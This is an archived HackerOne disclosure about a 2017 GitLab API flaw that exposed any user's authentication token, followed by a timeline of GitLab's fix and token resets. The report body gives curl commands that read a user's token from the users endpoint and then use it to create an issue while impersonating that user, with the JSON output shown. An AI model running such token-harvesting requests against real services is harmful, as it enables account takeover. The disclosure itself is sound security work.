---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/privilege-escalation
  - env/web
  - stack/gitlab
  - trigger/auth-required
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2017-09-21
submitted: 2017-09-15T22:13:20.680Z
bounty_usd: null
votes: 20
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "rpearl"
source: "https://hackerone.com/reports/268794"
title: "all private tokens are leaked to an unauthenticated attacker"
---
# all private tokens are leaked to an unauthenticated attacker

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 20 | **Program:** GitLab | **Disclosed:** 2017-09-21

- Report: [https://hackerone.com/reports/268794](https://hackerone.com/reports/268794)
- CWE: Privilege Escalation
- Submitted: 2017-09-15T22:13:20.680Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Using the api, one can obtain the authentication token for any user on gitlab:
```
$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
"[redacted]"
```

We can then use this token to impersonate any user to perform any action they can perform:
```$ curl --request POST --header "PRIVATE-TOKEN: [redacted]" https://gitlab.com/api/v4/projects/3831210/issues?title=owned```

```
{"id":6843690,"iid":4,"project_id":3831210,"title":"owned","description":"","state":"opened","created_at":"2017-09-15T21:58:06.342Z","updated_at":"2017-09-15T21:58:06.342Z","labels":[],"milestone":null,"assignees":[],"author":{"id":951422,"name":"Andrew Drake","username":"adrake","state":"active","avatar_url":"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon","web_url":"https://gitlab.com/adrake"},"assignee":null,"user_notes_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"weight":null,"web_url":"https://gitlab.com/karmiclabs/slabricator/issues/4","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"_links":{"self":"http://gitlab.com/api/v4/projects/3831210/issues/4","notes":"http://gitlab.com/api/v4/projects/3831210/issues/4/notes","award_emoji":"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji","project":"http://gitlab.com/api/v4/projects/3831210"},"subscribed":true}
```

## Timeline

- **Report Filed**
- **Report Triaged**
- **2017-09-16** @rpearl: Thanks @briann. Looks like the fix was deployed earlier and is now making its way into the public codebase. Let me know once it's public!

I am pretty sure this bug could have been used (combined with some carefully planned commits) for RCE on gitlab.com--or, separately, anyone using gitlab's CI, so I'm happy it got a very fast fix.
- **2017-09-16** @briann: Yes, it's a very serious bug and we're very thankful that you found and reported it to us. We've rolled out patches to all of our systems running the release candidate and we're in the process of performing a full investigation to determine the impact. We want to make sure we uncover all affected accounts so we can contact the users and ensure that no further harm was done. Until then we'd prefer to keep this quiet, of course.

We also had a support ticket opened by Arian with KarmicLabs so we're communicating via that route too.

We already have developers working on implementing a solution to ensure that these User objects don't fall victim to this type of disclosure again. And our security team is working on additional static analysis and network checks to pick this up should it occur again. 

Feel free to contact us here or via the support ticket. While I expect our investigation of affected users to conclude soon it will likely be next Monday before new packages are published. Thanks again!
- **2017-09-18** @rspeicher: @rpearl Hi Ryan. As Brian mentioned, we patched our systems on Friday evening after your initial report.

Since then, we've ensured the fix is in our `master` branches for CE and EE, as well as the `10-0-stable` branches from which our packages are built. That will cover people installing GitLab "from source".

RC4 packages, which were built from the stable branches this morning and which contain the fix, are now available to everyone installing via Omnibus packages. We recently finished deploying gitlab.com from an RC4 package and have verified the fix is still in place.

We've also completed our investigation into potential exploitation of this vulnerability and have determined that no malicious activity appears to have taken place. We identified a very small subset of users who *potentially* had their access tokens exposed and have reset their personal access, RSS, and incoming email tokens as a precaution. Those users will receive the email notification I've attached here.

Thank you again for the report!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
